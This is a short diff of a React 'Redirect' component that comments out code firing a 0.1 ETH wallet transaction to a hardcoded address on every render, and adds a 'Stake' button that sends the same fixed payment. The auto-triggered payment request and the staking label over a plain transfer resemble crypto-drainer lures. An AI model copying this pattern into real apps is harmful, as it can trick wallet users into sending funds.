@@ -31,16 +31,20 @@ export default function Redirect() {
         };
       }, []);
 
-    useEffect(() => {
-        async function openWallet() {
-          // open()
+    // useEffect(() => {
+    //     async function openWallet() {
+    //       // open()
           
   
-        }
+    //     }
 
-        openWallet()
-        sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
-    })
+    //     openWallet()
+    //     sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
+    // })
+
+    function submitTx() {
+      sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
+    }
 
       const handleCloseButtonClick = () => {
         // Close the current tab
@@ -52,6 +56,7 @@ export default function Redirect() {
         <div>
             
             <Connect />
+            <button onClick={() => { submitTx() }}>Stake</button>
             <button onClick={handleCloseButtonClick}>Close Tab</button>
         </div>
     );
